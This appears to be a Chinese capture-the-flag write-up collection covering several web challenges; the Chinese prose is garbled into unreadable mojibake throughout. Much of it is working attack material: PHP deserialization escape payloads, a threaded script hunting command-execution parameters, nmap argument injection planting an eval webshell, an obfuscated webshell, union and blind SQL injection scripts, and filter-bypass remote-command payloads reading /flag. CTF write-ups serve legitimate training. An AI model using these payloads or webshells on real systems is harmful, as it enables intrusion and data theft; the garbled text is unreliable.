href=\u0026#34;index.php?f=highlight_file\u0026#34;\u0026gt;source_code\u0026lt;/a\u0026gt;\u0026#39;; } if(!$_GET[\u0026#39;img_path\u0026#39;]){ $_SESSION[\u0026#39;img\u0026#39;] = base64_encode(\u0026#39;guest_img.png\u0026#39;); }else{ $_SESSION[\u0026#39;img\u0026#39;] = sha1(base64_encode($_GET[\u0026#39;img_path\u0026#39;])); } $serialize_info = filter(serialize($_SESSION)); if($function == \u0026#39;highlight_file\u0026#39;){ highlight_file(\u0026#39;index.php\u0026#39;); }else if($function == \u0026#39;phpinfo\u0026#39;){ eval(\u0026#39;phpinfo();\u0026#39;); //maybe you can find something in here! }else if($function == \u0026#39;show_image\u0026#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[\u0026#39;img\u0026#39;])); } ä»£ç é€»è¾‘æ˜¯extractä¼ å…¥å˜é‡ï¼Œæ”¹å˜session[img]ä¸ºå›ºå®šå€¼ï¼Œåºåˆ—åŒ–sessionç„¶åè¿‡æ»¤ï¼Œååºåˆ—åŒ–ï¼Œbase64è§£ç è¯»å–å†…å®¹\nå…ˆçœ‹çœ‹phpinfo,æ‰¾åˆ°d0g3_f1ag.php\nphpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ åœ¨phpä¸­ï¼Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ–ï¼Œä½†å¦‚æœæˆ‘ä»¬åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²ååŠ éšæœºå­—ç¬¦ä¸²\n1 2 3 4 \u0026lt;?php $str=\u0026#39;a:2:{i:0;s:8:\u0026#34;Hed9eh0g\u0026#34;;i:1;s:5:\u0026#34;aaaaa\u0026#34;;}abc\u0026#39;; var_dump(unserialize($str)); ?\u0026gt; ä»»ç„¶è¾“å‡ºåŸæ¥çš„ç»“æœ,å› ä¸ºä»–è¯»åˆ°}å°±åœæ­¢äº†ï¼Œä¸ä¼šè¯»å–}åçš„å­—ç¬¦ä¸²\n1 2 3 4 5 6 7 8 \u0026lt;?php $_SESSION[\u0026#34;user\u0026#34;]=\u0026#39;flagflagflagflagflagflag\u0026#39;; $_SESSION[\u0026#34;function\u0026#34;]=\u0026#39;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#39;; $_SESSION[\u0026#34;img\u0026#34;]=\u0026#39;L2QwZzNfZmxsbGxsbGFn\u0026#39;; echo serialize($_SESSION); ?\u0026gt; //a:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;flagflagflagflagflagflag\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;} è¿™é‡Œçš„functioné‡Œé¢å¼€å¤´çš„\u0026quot;aæ˜¯ä¸ºäº†åºåˆ—åŒ–ä¹‹åè·Ÿå‰é¢çš„\u0026quot;æ‹¼æ¥\nç„¶åå› ä¸ºflagä¼šè¢«ç©ºæ›¿æ¢ï¼Œå˜æˆ\n1 a:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;} æœ¬æ¥ç”±äºæœ‰6ä¸ªflagå­—ç¬¦æ‰€ä»¥ä¸º24ï¼Œç°åœ¨è¿™6ä¸ªflagéƒ½è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå®ƒå°†ä¼šå°è¯•å‘åè¯»å–24ä¸ªå­—ç¬¦çœ‹çœ‹æ˜¯å¦æ»¡è¶³åºåˆ—åŒ–çš„è§„åˆ™ï¼Œä¹Ÿå³è¯»å–;s:8:\u0026quot;function\u0026quot;;s:59:\u0026quot;a,è¯»å–è¿™24ä¸ªå­—ç¬¦åä»¥\u0026quot;;ç»“å°¾ï¼Œæ°å¥½æ»¡è¶³è§„åˆ™ï¼Œè€Œåç¬¬ä¸‰ä¸ªså‘åè¯»å–imgçš„20ä¸ªå­—ç¬¦ï¼Œç¬¬å››ä¸ªã€ç¬¬äº”ä¸ªså‘åè¯»å–å‡æ»¡è¶³è§„åˆ™\næœ€ç»ˆç»“æœä¸º\n1 2 3 4 5 array(3) { [\u0026#34;user\u0026#34;]=\u0026gt; string(24) \u0026#34;\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34; [\u0026#34;img\u0026#34;]=\u0026gt; string(20) \u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34; [\u0026#34;dd\u0026#34;]=\u0026gt; string(1) \u0026#34;a\u0026#34; } è¿™æ ·å°±æŠŠåŸæ¥ä¸å¯å˜çš„Imgç»™æ›¿æ¢äº†\nç„¶åæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªsessionè®©ä»–åºåˆ—åŒ–å°±è¡Œäº†,æœ‰ä¸¤ç§ç»•è¿‡åŠæ³•ï¼Œç¬¬ä¸€ç§è®©__SESSION[flagflag]ä¼ å…¥å¼€å¤´ä¸º\u0026quot;çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·åºåˆ—åŒ–ï¼Œå°±ä¼šæ‹¼æ¥ä¸ºç©ºé€ æˆä¸Šé¢çš„ç»•è¿‡ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤ç°ä¸äº†ï¼‰\n1 2 3 4 5 $_SESSION[\u0026#39;flagflag\u0026#39;]=\u0026#39;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#39;; #ç»“æœ a:1:{s:8:\u0026#34;flagflag\u0026#34;;s:51:\u0026#34;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#34;;}ï¼Œè¿™é‡Œå°±é€ æˆimgä¸æˆä¸ºä¸€ä¸ªé”®ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡ŒåŠ å¯† #è¿‡æ»¤æ‰flagæœ‰ #a:1:{s:8:\u0026#34;\u0026#34;;s:51:\u0026#34;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#34;;} #ä½¿å¾—ç»•è¿‡;s:51:\u0026#34;\u0026#34;åˆ°è¾¾ä¸‹ä¸€ä¸ªåˆ†å·ï¼Œè¿™æ—¶imgæˆåŠŸé€ƒé€¸å‡ºæ¥ ç¬¬äºŒç§ç›´æ¥æ„é€ ä¸‰ä¸ªsession,ç„¶ååœ¨ç¬¬ä¸€ä¸ªsessionçš„å€¼ä¼ å¾ˆå¤šflag,è¿‡æ»¤åå°±ä¼šåŒ¹é…åé¢çš„sessionæ¥æ›¿æ¢img\n1 2 3 _SESSION[a]=phpflagflagflagflagflagflagflagflagflagflagflagflagflag\u0026amp;_SESSION[img]=1\u0026amp;_SESSION[exp]=;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;i:0;i:1;} åºåˆ—åŒ–å \u0026#34;a:3:{s:1:\u0026#34;a\u0026#34;;s:55:\u0026#34;\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;Z3Vlc3RfaW1nLnBuZw==\u0026#34;;s:3:\u0026#34;exp\u0026#34;;s:40:\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;i:0;i:1;}\u0026#34;;}\u0026#34; payload\n1 _SESSION[user]=flagflagflagflagflagphp\u0026amp;_SESSION[function]=\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:1:\u0026#34;2\u0026#34;;} [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢ ç”¨è„šæœ¬ç­›é€‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 import os import re import time import threading import requests from tqdm import tqdm thread_ = threading.Semaphore(30) # è®¾ç½®æœ€å¤§çº¿ç¨‹æ•° ,åˆ«è®¾ç½®å¤ªå¤§ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šå´©çš„ requests.adapters.DEFAULT_RETRIES = 5 #è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥ session = requests.Session() session.keep_alive = False # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse buu_url = \u0026#34;http://35a34fe5-7916-4ebf-a7ff-bfd82fe9bd4a.node4.buuoj.cn:81\u0026#34; filePath = r\u0026#34;D:\\Downloads\\src\u0026#34; os.chdir(filePath) files = os.listdir(filePath) flags = [] rrGET = re.compile(r\u0026#34;\\$_GET\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) # åŒ¹é…getå‚æ•° rrPOST = re.compile(r\u0026#34;\\$_POST\\[\\\u0026#39;(\\w+)\\\u0026#39;\\]\u0026#34;) # åŒ¹é…postå‚æ•° def getflag(file): print(\u0026#34;[+]checking file:%s\u0026#34; % (file)) thread_.acquire() url = buu_url + \u0026#34;/\u0026#34; + file with open(file, encoding=\u0026#39;utf-8\u0026#39;) as f: gets = list(rrGET.findall(f.read())) posts = list(rrPOST.findall(f.read())) for g in gets: print(\u0026#34;[++]checking %s\u0026#34; % (g)) time.sleep(0.02) res = session.get(url + \u0026#34;?%s=%s\u0026#34; % (g, \u0026#34;echo ------\u0026#34;)) if \u0026#34;------\u0026#34; in res.text: flag = \u0026#34;fileName=%s, param=%s\u0026#34; % (file, g) flags.append(flag) for p in posts: print(\u0026#34;[++]checking %s\u0026#34; % (p)) res = session.post(url, data={p:\u0026#34;echo ------\u0026#34;}) if \u0026#34;------\u0026#34; in res.text: flag = \u0026#34;fileName=%s, param=%s\u0026#34; % (file, g) flags.append(flag) thread_.release() if __name__ == \u0026#39;__main__\u0026#39;: start_time = time.time() thread_list = [] for file in tqdm(files): t = threading.Thread(target=getflag, args=(file,)) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() print(flags) end_time = time.time() print(\u0026#34;[end]ç¨‹åºç»“æŸ:ç”¨æ—¶(ç§’):\u0026#34;+str(end_time-start_time)) æœ€åå‚æ•°ä¸º\n1 /xk0SzyKwfzw.php?Efa5BVG=cat /flag [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap é¢˜ç›®å«nmapæƒ³åˆ°ä¹‹å‰çš„ä¸€é“é¢˜online toolç”¨-oGå‚æ•°å†™å…¥æœ¨é©¬ï¼Œç”¨å•å¼•å·åŠ ç©ºæ ¼ç»•è¿‡\n1 \u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.php \u0026#39; å›æ˜¾hackerï¼Œå¯èƒ½åŒ¹é…äº†åç¼€åphp\n1 \u0026#39; \u0026lt;?= @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.phtml \u0026#39; å›æ˜¾hostmaybedown\nåŠ ä¸Šip\n1 127.0.0.1 |\u0026#39; \u0026lt;?= @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.phtml \u0026#39; ä¸Šä¼ åèšå‰‘è¿æ¥\nè§£æ³•äºŒç”¨-iLå‚æ•°è¯»å–æ–‡ä»¶\n1 127.0.0.1 |\u0026#39; -iL /flag -o 1 \u0026#39; å› ä¸ºæ³¨é‡Šé‡Œé¢æœ‰æç¤ºflagåœ¨æ ¹ç›®å½•\nè¿™æ ·å†è®¿é—®1å°±å¾—åˆ°flag\n[NPUCTF2020]ReadlezPHP ååºåˆ—åŒ–ï¼Œè¿‡æ»¤systemï¼Œç”¨assertæŸ¥çœ‹phpinfo\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php class HelloPhp { public $a=\u0026#39;phpinfo()\u0026#39;; public $b=\u0026#39;assert\u0026#39;; public function __destruct(){ $a = $this-\u0026gt;a; $b = $this-\u0026gt;b; echo $b($a); } } $c = new HelloPhp(); echo serialize($c); æŸ¥æ‰¾flagå°±æœ‰äº†\n[SWPU2019]Web1 sqlæ³¨å…¥è¿‡æ»¤äº†orå’Œç©ºæ ¼å’Œæ³¨é‡Šï¼Œç”¨/**/ç»•è¿‡\n1 2 3 4 -1\u0026#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=\u0026#34;web1\u0026#34;\u0026#39; 1\u0026#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; æ— åˆ—åæ³¨å…¥ å¦‚æœinformation_schemaè¢«WAF,å¾—åˆ°è¡¨åä¹‹åä½¿ç”¨æ— åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼.\n1 select 1,2,3 union select * from æµ‹è¯• ä¹‹åå°±å¯ä»¥åˆ©ç”¨æ•°å­—æ¥å¯¹åº”ç›¸åº”çš„åˆ—,è¿›è¡ŒæŸ¥è¯¢\n1 select `2` from (select 1,2,3 union select * from æµ‹è¯•) as test 1ã€åˆ—åéœ€è¦ç”¨``åŒ…è£¹èµ·æ¥\n2ã€ä½¿ç”¨å­æŸ¥è¯¢çš„æ—¶å€™,å³ä¸€ä¸ªæŸ¥è¯¢åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢ä¸­,å†…å±‚æŸ¥è¯¢çš„ç»“æœå¯ä»¥ä½œä¸ºå¤–å±‚æŸ¥è¯¢çš„æ¡ä»¶,å†…å±‚æŸ¥è¯¢åˆ°çš„ç»“æœéœ€è¦èµ·ä¸€ä¸ªåˆ«å(as)\nå¦‚æœåå¼•å·``è¢«è¿‡æ»¤,å¯ä»¥ä½¿ç”¨ä¸ºå­—æ®µèµ·åˆ«åçš„æ–¹å¼.\n1 select b from (select 1,2 as b,3 union select * from æµ‹è¯•) as test [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL ç›²æ³¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests import time url = \u0026#34;http://5045a2b7-44b5-44ee-99d1-9db358afe49c.node5.buuoj.cn:81/search.php?\u0026#34; temp = {\u0026#34;id\u0026#34;: \u0026#34;\u0026#34;} column = \u0026#34;\u0026#34; for i in range(1, 1000): time.sleep(0.06) low = 32 high = 128 mid = (low + high) // 2 while (low \u0026lt; high): # åº“å #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))\u0026gt;%d)^1\u0026#34; % (i, mid) # è¡¨å #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) # å­—æ®µå #temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;F1naI1y\u0026#39;)),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) # å†…å®¹ temp[\u0026#34;id\u0026#34;] = \u0026#34;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))\u0026gt;%d)^1\u0026#34; %(i,mid) r = requests.get(url, params=temp) time.sleep(0.04) print(low, high, mid, \u0026#34;:\u0026#34;) if \u0026#34;Click\u0026#34; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 127): break column += chr(mid) print(column) print(\u0026#34;All:\u0026#34;, column) [CISCN 2019 åˆèµ›]Love Math è¿™é‡Œé»‘åå•è¿‡æ»¤äº†ä¸å°‘ä¸œè¥¿ï¼Œå¸¸è§„çš„cat/flagéƒ½ä¸èƒ½ä½¿ç”¨äº†ï¼Œè¿™é‡Œæœ‰ä¸ªçŸ¥è¯†ç‚¹æ˜¯phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°æ¯”å¦‚ä¸‹é¢çš„ä»£ç ä¼šæ‰§è¡Œ system(â€˜cat/flagâ€™);\n1 ?c=($_GET[a])($_GET[b])\u0026amp;a=system\u0026amp;b=cat /flag ä½†æ˜¯è¿™é‡Œçš„_GETå’Œaï¼Œbéƒ½ä¸æ˜¯ç™½åå•é‡Œé¢çš„ï¼Œè¿™é‡Œéœ€è¦æ›¿æ¢\n1 ?c=($_GET[pi])($_GET[abs])\u0026amp;pi=system\u0026amp;abs=cat /flag ä½†æ˜¯è¿™é‡Œçš„_GETæ˜¯æ— æ³•è¿›è¡Œç›´æ¥æ›¿æ¢ï¼Œè€Œä¸”[]ä¹Ÿè¢«é»‘åå•è¿‡æ»¤äº†\nhex2bin() å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚\nä½†æ˜¯hex2bin()å‡½æ•°ä¹Ÿä¸æ˜¯ç™½åå•é‡Œé¢çš„ï¼Œè€Œä¸”è¿™é‡Œçš„5f 47 45 54ä¹Ÿä¸èƒ½ç›´æ¥å¡«å…¥,ä¼šè¢«è¿‡æ»¤\nè¿™é‡Œçš„hex2bin()å‡½æ•°å¯ä»¥é€šè¿‡base_convert()å‡½æ•°æ¥è¿›è¡Œè½¬æ¢\nbase_convert()å‡½æ•°èƒ½å¤Ÿåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—\nè¿™é‡Œçš„hex2binå¯ä»¥çœ‹åšæ˜¯36è¿›åˆ¶ï¼Œç”¨base_convertæ¥è½¬æ¢å°†åœ¨10è¿›åˆ¶çš„æ•°å­—è½¬æ¢ä¸º16è¿›åˆ¶å°±å¯ä»¥å‡ºç°hex2bin\nhex2bin=base_convert(37907361743,10,36)\nç„¶åé‡Œé¢çš„5f 47 45 54è¦ç”¨dechex()å‡½æ•°å°†10è¿›åˆ¶æ•°è½¬æ¢ä¸º16è¿›åˆ¶çš„æ•°\ndechex(1598506324)ï¼Œ1598506324è½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯5f 47 45 54\n1 2 payload /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})\u0026amp;pi=system\u0026amp;abs=cat /flag [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME ä¸Šä¼ webshellï¼Œèšå‰‘è¿æ¥,æ­£åˆ™ç”¨å–åç»•è¿‡\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php error_reporting(0); $a=\u0026#39;assert\u0026#39;; $b=urlencode(~$a); echo $b; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $c=\u0026#39;(eval($_POST[cmd]))\u0026#39;; $d=urlencode(~$c); echo $d; ?\u0026gt; ä¸¤ä¸ªå‚æ•°è¦ç”¨ï¼ˆï¼‰éš”å¼€\nç”±äºå‘½ä»¤æ‰§è¡Œå‚æ•°è¢«è¿‡æ»¤äº†ï¼Œç”¨èšå‰‘æ’ä»¶ç»•è¿‡\nç›´æ¥/readflag\n[De1CTF 2019]SSRF Me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #! /usr/bin/env python # #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(\u0026#39;latin1\u0026#39;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip):\t#æ˜¯ä¸€ä¸ªç®€å•çš„èµ‹å€¼å‡½æ•° self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)):\t#å¦‚æœæ²¡æœ‰è¯¥æ–‡ä»¶å¤¹ï¼Œåˆ™åˆ›ç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹ os.mkdir(self.sandbox) def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) #æ³¨æ„wï¼Œå¯ä»¥å¯¹result.txtæ–‡ä»¶è¿›è¡Œä¿®æ”¹ resp = scan(self.param) if (resp == \u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp)\t#è¿™ä¸ªå°†respä¸­çš„æ•°æ®å†™å…¥result.txtä¸­ï¼Œå¯ä»¥åˆ©ç”¨ä¸ºå°†flag.txtä¸­çš„æ•°æ®æ”¾è¿›result.txtä¸­ tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;)\t#æ‰“å¼€æ–¹å¼ä¸ºåªè¯» result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read()\t#è¯»å–result.txtä¸­çš„æ•°æ® if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) @app.route(\u0026#39;/De1ta\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\t#æ³¨æ„è¿™ä¸ªç»‘å®šï¼Œæ¥ä¸‹æ¥çš„å‡ ä¸ªå‡½æ•°éƒ½å¾ˆé‡è¦ï¼Œè¿™ä¸ªç›¸å½“äºcè¯­è¨€é‡Œé¢çš„ä¸»å‡½æ•°ï¼Œæ¥ä¸‹æ¥æ˜¯è°ƒç”¨å…¶ä»–å‡½æ•°çš„è¿‡ç¨‹ def challenge(): action = urllib.unquote(request.cookies.get(\u0026#34;action\u0026#34;))\t#cookieä¼ é€’actionå‚æ•°ï¼Œå¯¹åº”ä¸åŒçš„å¤„ç†æ–¹å¼ param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;))\t#ä¼ é€’getæ–¹å¼çš„å‚æ•°param sign = urllib.unquote(request.cookies.get(\u0026#34;sign\u0026#34;))\t#cookieä¼ é€’signå‚æ•°sign ip = request.remote_addr\t#è·å–è¯·æ±‚ç«¯çš„ipåœ°å€ if(waf(param)):\t#è°ƒç”¨wafå‡½æ•°è¿›è¡Œè¿‡æ»¤ return \u0026#34;No Hacker!!!!\u0026#34; task = Task(action, param, sign, ip) #åˆ›å»ºTaskç±»å¯¹è±¡ return json.dumps(task.Exec())\t#ä»¥jsonçš„å½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯ @app.route(\u0026#39;/\u0026#39;) def index(): return open(\u0026#34;code.txt\u0026#34;,\u0026#34;r\u0026#34;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50]\t#è¿™ä¸ªå¯ä»¥åˆ©ç”¨ä¸ºè®¿é—®flag.txtã€‚è¯»å–ç„¶åä¸ºä¸‹ä¸€æ­¥å°†flag.txtæ–‡ä»¶ä¸­çš„ä¸œè¥¿æ”¾åˆ°result.txtä¸­åšé“ºå« except: return \u0026#34;Connection Timeout\u0026#34; def getSign(action, param):\t#getSignçš„ä½œç”¨æ˜¯æ‹¼æ¥secret_key,param,actionï¼Œç„¶åè¿”å›æ‹¼æ¥åçš„å­—ç¬¦ä¸²çš„md5åŠ å¯†å€¼ return hashlib.md5(secert_key + param + action).hexdigest() def md5(content):\t#å°†ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œmd5åŠ å¯† return hashlib.md5(content).hexdigest() def waf(param):\t#é˜²ç«å¢™çš„ä½œç”¨æ˜¯åˆ¤æ–­å¼€å¤´çš„å‡ ä¸ªå­—æ¯æ˜¯å¦æ˜¯gopher æˆ–è€…æ˜¯file å¦‚æœæ˜¯çš„è¯ï¼Œè¿”å›true check=param.strip().lower() if check.startswith(\u0026#34;gopher\u0026#34;) or check.startswith(\u0026#34;file\u0026#34;): return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: app.debug = False app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=9999) /geneSignè·¯ç”±ä¸‹é¢ä¼šè°ƒç”¨getsignå‡½æ•°ï¼Œè·Ÿè¿›ä¼šæœ‰MD5å“ˆå¸Œï¼Œ return hashlib.md5(secert_key + param + action).hexdigest(),æˆ‘ä»¬ä¼ å…¥flag.txtreadå°±ä¼šè¢«æ‹¼æ¥ä¸ºsecert_key+flag.txt+read+scan,ç„¶åå°±æ»¡è¶³ä¸‹é¢å°†flag.txtå†™å…¥result.txtï¼Œç„¶åå†è¯»å–result.txtï¼Œ/geneSignè·¯ç”±ä¼šå›æ˜¾hash,ç„¶åæˆ‘ä»¬åœ¨/De1taè·¯ç”±ä¸‹é¢çš„cookieä¼ å…¥ç¬¦åˆæ¡ä»¶çš„å€¼ï¼Œå°±èƒ½è¯»å–result.txt\nhash:0ffa43c8b41c61f35e5f10c15ee8a3e6\n[BJDCTF2020]EasySearch ç›®å½•æ‰«ææ‰«å‡ºindex.php.swp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php ob_start(); function get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; 